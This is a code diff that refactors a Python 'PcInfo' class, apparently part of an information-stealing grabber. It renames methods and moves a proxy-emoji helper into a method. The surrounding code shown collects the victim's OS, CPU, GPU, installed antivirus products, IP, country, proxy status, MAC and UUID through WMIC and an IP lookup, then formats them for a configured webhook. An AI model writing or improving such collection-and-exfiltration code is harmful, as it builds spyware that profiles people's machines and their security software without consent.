@@ -7,6 +7,9 @@ import subprocess
 class PcInfo:
     def __init__(self):
         self.get_inf(__CONFIG__["webhook"])
+
+    def get_proxy_emoji(self, proxy):
+        return ":shield:" if proxy else ":x:"
         
     def get_country_code(self, country_name):
         try:
@@ -15,7 +18,7 @@ class PcInfo:
         except LookupError:
             return "white"
 
-    def getAVSolutions(self) -> str:
+    def get_all_avs(self) -> str:
         process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell=True, capture_output=True)
         if process.returncode == 0:
             output = process.stdout.decode(errors="ignore").strip().replace("\r\n", "\n").splitlines()
@@ -24,7 +27,7 @@ class PcInfo:
                 output = [av.strip() for av in output]
                 return ", ".join(output)
 
-    def get_inf(self, webhook):
+    def get_system_info(self, webhook):
         computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
         cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
         gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
@@ -40,8 +43,7 @@ class PcInfo:
                 raise Exception("Failed")
             country = r["country"]
             proxy = r["proxy"]
-            ip = r["query"] 
-            proxy_emoji = lambda proxy: ":shield:" if proxy else ":x:"  
+            ip = r["query"]   
         except Exception:
             country = "Failed to get country"
             proxy = "Failed to get proxy"
@@ -63,7 +65,7 @@ class PcInfo:
 :globe_with_meridians: **OS:** `{computer_os}`\n
 :eyes: **IP:** `{ip}`
 :flag_{self.get_country_code(country)}: **Country:** `{country}`
-{proxy_emoji(proxy)} **Proxy:** `{proxy}`
+{self.get_proxy_emoji(proxy)} **Proxy:** `{proxy}`
 :green_apple: **MAC:** `{mac}`
 :wrench: **UUID:** `{uuid}`\n
 <:cpu:1051512676947349525> **CPU:** `{cpu}`
